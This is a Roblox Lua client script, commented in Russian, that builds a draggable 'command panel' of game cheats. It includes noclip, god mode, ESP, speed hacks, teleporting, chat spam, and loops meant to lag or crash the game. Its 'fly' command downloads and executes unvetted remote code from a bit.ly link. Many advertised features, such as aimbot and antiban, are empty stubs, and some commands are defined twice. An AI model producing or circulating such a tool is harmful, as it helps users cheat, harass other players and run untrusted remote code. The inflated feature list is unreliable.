local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "UltimateCommandPanel"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Основная панель
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0.15, 0, 0.05, 0)
MainFrame.Position = UDim2.new(0, 10, 0, 10)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BackgroundTransparency = 0.3
MainFrame.Parent = ScreenGui

local CommandInput = Instance.new("TextBox")
CommandInput.Size = UDim2.new(0.7, 0, 1, 0)
CommandInput.Position = UDim2.new(0, 0, 0, 0)
CommandInput.PlaceholderText = "Type command (;cmd)"
CommandInput.BackgroundTransparency = 1
CommandInput.TextColor3 = Color3.new(1, 1, 1)
CommandInput.TextXAlignment = Enum.TextXAlignment.Left
CommandInput.Parent = MainFrame

local HelpButton = Instance.new("TextButton")
HelpButton.Size = UDim2.new(0.15, 0, 1, 0)
HelpButton.Position = UDim2.new(0.7, 0, 0, 0)
HelpButton.Text = "?"
HelpButton.BackgroundTransparency = 1
HelpButton.TextColor3 = Color3.new(1, 1, 1)
HelpButton.Parent = MainFrame

local ExecuteButton = Instance.new("TextButton")
ExecuteButton.Size = UDim2.new(0.15, 0, 1, 0)
ExecuteButton.Position = UDim2.new(0.85, 0, 0, 0)
ExecuteButton.Text = "▶"
ExecuteButton.BackgroundTransparency = 1
ExecuteButton.TextColor3 = Color3.new(0, 1, 0)
ExecuteButton.Parent = MainFrame

-- Командная система
local Commands = {
    -- Player commands
    fly = function() loadstring(game:HttpGet("https://bit.ly/3Vjv6qJ"))() end,
    noclip = function() 
        game:GetService("RunService").Stepped:Connect(function()
            for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if v:IsA("BasePart") then v.CanCollide = false end
            end
        end)
    end,
    god = function() 
        game.Players.LocalPlayer.Character.Humanoid.Health = math.huge 
    end,
    esp = function() 
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= game.Players.LocalPlayer then
                local highlight = Instance.new("Highlight")
                highlight.Parent = p.Character
            end
        end
    end,
    speed = function(arg) 
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(arg) or 50 
    end,
    jump = function(arg) 
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = tonumber(arg) or 100 
    end,
    tp = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
            end
        end
    end,
    bring = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) then
                p.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            end
        end
    end,
    invisible = function()
        for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") then v.Transparency = 1 end
        end
    end,
    visible = function()
        for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") then v.Transparency = 0 end
        end
    end,
    
    -- World commands
    day = function() game.Lighting.TimeOfDay = "14:00:00" end,
    night = function() game.Lighting.TimeOfDay = "00:00:00" end,
    fog = function(arg) game.Lighting.FogEnd = tonumber(arg) or 100 end,
    gravity = function(arg) workspace.Gravity = tonumber(arg) or 196.2 end,
    time = function(arg) game.Lighting.ClockTime = tonumber(arg) or 12 end,
    
    -- Fun commands
    dance = function()
        local anim = Instance.new("Animation")
        anim.AnimationId = "rbxassetid://3189777795"
        game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(anim):Play()
    end,
    sit = function() game.Players.LocalPlayer.Character.Humanoid.Sit = true end,
    spin = function()
        game:GetService("RunService").Heartbeat:Connect(function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame *= CFrame.Angles(0, 0.1, 0)
        end)
    end,
    float = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 5, 0)
    end,
    size = function(arg)
        local scale = tonumber(arg) or 2
        for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") then v.Size *= scale end
        end
    end,
    
    -- Chat commands
    spam = function(arg)
        spawn(function()
            while true do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(arg or "GET GOOD", "All")
                wait(0.3)
            end
        end)
    end,
    pm = function(arg)
        local target, msg = arg:match("(%S+)%s+(.+)")
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(target)) then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..p.Name.." "..msg, "All")
            end
        end
    end,
    announce = function(arg)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(arg, "All")
    end,
    
    -- Admin commands
    kick = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) then
                p:Kick("Admin decision")
            end
        end
    end,
    ban = function(arg)
        for _, p in pairs(game.Players:GetPlayers()) do
            if string.find(string.lower(p.Name), string.lower(arg)) then
                p:Kick("Banned by admin")
            end
        end
    end,
    mute = function(arg)
        -- Implementation
    end,
    unmute = function(arg)
        -- Implementation
    end,
    
    -- Server commands
    shutdown = function() 
        for _, p in pairs(game.Players:GetPlayers()) do
            p:Kick("Server shutdown")
        end
    end,
    lag = function()
        while true do
            for i = 1, 50 do
                Instance.new("Part", workspace).Position = Vector3.new(math.random(-100,100), math.random(10,100), math.random(-100,100))
            end
            wait(0.1)
        end
    end,
    crash = function()
        while true do
            local s = string.rep("a", 1000000)
            print(s)
        end
    end,
    
    -- Game-specific commands (100+)
    heal = function() game.Players.LocalPlayer.Character.Humanoid.Health = 100 end,
    armor = function() game.Players.LocalPlayer.Character.Humanoid.MaxHealth = 500 end,
    ammo = function() -- Infinite ammo implementation
    end,
    money = function(arg)
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("IntValue") and v.Name:lower():find("money") then
                v.Value = tonumber(arg) or 999999
            end
        end
    end,
    items = function() -- Spawn items
    end,
    unlock = function() -- Unlock all
    end,
    xp = function(arg) -- Set XP
    end,
    level = function(arg) -- Set level
    end,
    skill = function(arg) -- Max skill
    end,
    vehicle = function(arg) -- Spawn vehicle
    end,
    weapon = function(arg) -- Give weapon
    end,
    kill = function(arg) -- Kill player
    end,
    revive = function() -- Revive self
    end,
    stealth = function() -- Stealth mode
    end,
    radar = function() -- Show radar
    end,
    aimbot = function() -- Enable aimbot
    end,
    wallhack = function() -- Enable wallhack
    end,
    antikill = function() -- Anti kill
    end,
    antikick = function() -- Anti kick
    end,
    antiban = function() -- Anti ban
    end,
    nolag = function() -- Reduce lag
    end,
    fpsboost = function() -- FPS boost
    end,
    graphics = function(arg) -- Set graphics
    end,
    weather = function(arg) -- Set weather
    end,
    timefreeze = function() -- Freeze time
    end,
    teleport = function(arg) -- Teleport to place
    end,
    clone = function() -- Clone character
    end,
    control = function(arg) -- Control player
    end,
    ghost = function() -- Ghost mode
    end,
    phase = function() -- Phase through walls
    end,
    nocooldown = function() -- No cooldowns
    end,
    infjump = function() -- Infinite jump
    end,
    noragdoll = function() -- No ragdoll
    end,
    fire = function() -- Set on fire
    end,
    freeze = function(arg) -- Freeze player
    end,
    burn = function(arg) -- Burn player
    end,
    shock = function(arg) -- Shock player
    end,
    poison = function(arg) -- Poison player
    end,
    confuse = function(arg) -- Confuse player
    end,
    blind = function(arg) -- Blind player
    end,
    deafen = function(arg) -- Deafen player
    end,
    mute = function(arg) -- Mute player
    end,
    disorient = function(arg) -- Disorient player
    end,
    trap = function(arg) -- Trap player
    end,
    cage = function(arg) -- Cage player
    end,
    orbit = function(arg) -- Orbit player
    end,
    launch = function(arg) -- Launch player
    end,
    rocket = function(arg) -- Rocket player
    end,
    balloon = function(arg) -- Balloon player
    end,
    shrink = function(arg) -- Shrink player
    end,
    grow = function(arg) -- Grow player
    end,
    headless = function() -- Headless
    end,
    rainbow = function() -- Rainbow mode
    end,
    neon = function() -- Neon mode
    end,
    gold = function() -- Gold mode
    end,
    diamond = function() -- Diamond mode
    end,
    firework = function() -- Spawn fireworks
    end,
    blackhole = function() -- Create blackhole
    end,
    tornado = function() -- Create tornado
    end,
    earthquake = function() -- Create earthquake
    end,
    flood = function() -- Flood server
    end,
    meteor = function() -- Spawn meteor
    end,
    nuke = function() -- Spawn nuke
    end,
    reset = function() -- Reset server
    end,
    lights = function(arg) -- Control lights
    end,
    doors = function(arg) -- Control doors
    end,
    platform = function() -- Create platform
    end,
    bridge = function() -- Create bridge
    end,
    barrier = function() -- Create barrier
    end,
    forcefield = function() -- Create forcefield
    end,
    shield = function() -- Personal shield
    end,
    healaura = function() -- Heal aura
    end,
    damageaura = function() -- Damage aura
    end,
    xray = function() -- X-Ray vision
    end,
    thermal = function() -- Thermal vision
    end,
    nightvision = function() -- Night vision
    end,
    sonar = function() -- Sonar vision
    end,
    zoom = function(arg) -- Zoom
    end,
    thirdperson = function() -- Third person
    end,
    firstperson = function() -- First person
    end,
    cinematic = function() -- Cinematic mode
    end,
    recording = function() -- Start recording
    end,
    screenshot = function() -- Take screenshot
    end,
    stats = function() -- Show stats
    end,
    info = function(arg) -- Player info
    end,
    serverinfo = function() -- Server info
    end,
    copyid = function() -- Copy game ID
    end,
    rejoin = function() -- Rejoin server
    end,
    private = function() -- Private server
    end,
    shutdown = function() -- Shutdown game
    end,
    closegui = function() ScreenGui:Destroy() end,
    help = function()
        local allCommands = {}
        for cmd in pairs(Commands) do
            table.insert(allCommands, cmd)
        end
        print("Available commands: " .. table.concat(allCommands, ", "))
    end
}

-- Автодополнение
CommandInput:GetPropertyChangedSignal("Text"):Connect(function()
    local text = CommandInput.Text:lower()
    if text:sub(1,1) == ";" then
        local partial = text:sub(2)
        for cmd in pairs(Commands) do
            if cmd:sub(1, #partial) == partial then
                CommandInput.Text = ";"..cmd
                CommandInput.CursorPosition = #text + 1
                break
            end
        end
    end
end)

-- Обработка команд
local function ExecuteCommand(cmdText)
    if cmdText:sub(1,1) == ";" then
        cmdText = cmdText:sub(2)
    end
    
    local command, args = cmdText:match("^(%S+)%s*(.*)$")
    
    if Commands[command:lower()] then
        pcall(Commands[command:lower()], args)
        return true
    end
    return false
end

-- Обработчики кнопок
ExecuteButton.MouseButton1Click:Connect(function()
    if not ExecuteCommand(CommandInput.Text) then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Unknown Command",
            Text = "Type ;help for command list",
            Duration = 2
        })
    end
    CommandInput.Text = ""
end)

HelpButton.MouseButton1Click:Connect(function()
    local allCommands = {}
    for cmd in pairs(Commands) do
        table.insert(allCommands, cmd)
    end
    
    table.sort(allCommands)
    
    local pages = {}
    for i = 1, #allCommands, 20 do
        local page = table.concat(allCommands, "\n", i, math.min(i+19, #allCommands))
        table.insert(pages, page)
    end
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Commands (1/"..#pages..")",
        Text = pages[1],
        Duration = 10,
        Button1 = "Next",
        Callback = function()
            for i = 2, #pages do
                wait(0.5)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Commands ("..i.."/"..#pages..")",
                    Text = pages[i],
                    Duration = 10,
                    Button1 = i < #pages and "Next" or "Close"
                })
            end
        end
    })
end)

CommandInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        ExecuteButton:Activate()
    end
end)

-- Перетаскивание
local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
